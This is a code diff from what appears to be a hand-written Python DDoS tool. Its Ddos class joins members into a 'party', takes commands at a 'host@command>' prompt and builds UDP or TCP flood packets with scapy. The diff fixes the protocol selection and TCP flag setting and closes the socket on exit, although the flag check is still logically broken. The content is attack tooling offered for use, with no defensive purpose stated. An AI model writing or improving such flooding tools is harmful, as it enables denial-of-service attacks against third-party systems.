@@ -7,7 +7,6 @@ class PortScanner:
     def __init__(self):
         pass
 
-
 class Ddos:
     def __init__(self):
         self.Join = True
@@ -47,6 +46,7 @@ class Ddos:
         thrd = Thread(target=self._JoinParty, args=())
         thrd.start()
 
+        Protocol = ""
         Flag = ""
         while True:
             Input = input("   host@command>")
@@ -63,24 +63,26 @@ class Ddos:
                 self.Join = True
             elif "-protocol" in Input:
                 for char in range(10, len(Input)):
-                    Flag += Input[char]
-                if Flag == "udp":
-                    self.PacketBlueprint/UDP()
-                elif Flag == "tcp":
-                    self.PacketBlueprint/TCP()
+                    Protocol += Input[char]
+                if Protocol == "udp":
+                    self.PacketBlueprint = self.PacketBlueprint/UDP()
+                elif Protocol == "tcp":
+                    self.PacketBlueprint = self.PacketBlueprint/TCP()
                 else:
-                    print(f"\n   [!]Not a valid protocol parameter:{Flag}")
-                Flag = ""
+                    print(f"\n   [!]Not a valid protocol parameter:{Protocol}")
+                Protocol = ""
             elif "-flag" in Input and self.PacketBlueprint.haslayer(TCP):
+                flag: int = 0
                 for char in range(6, len(Input)):
-                    Flag += Input[char]
-                    if Flag == "SYN" or "URG" or "UDP" or "CWR" or "RST" or "FIN" or "ECE" or "PSH" or "ACK":
-                        self.PacketBlueprint[TCP].flags |= self.Flags.get(Input[char + 6])
+                    if (Flag == "SYN" or "URG" or "UDP" or "CWR" or "RST" or "FIN" or "ECE" or "PSH" or "ACK"):
+                        flag += int(self.Flags.get(Flag))
+                        self.PacketBlueprint[TCP].flags = self.PacketBlueprint/TCP(flags=flag)
                         Flag = ""
-                    #Flag = ""
+                    Flag += Input[char]
             elif Input == "-help":
                 print(Menus.HelpMenu)
             elif Input == "exit":
+                self.sock.close()
                 break
             else:
                 for i in range(len(self.members)):
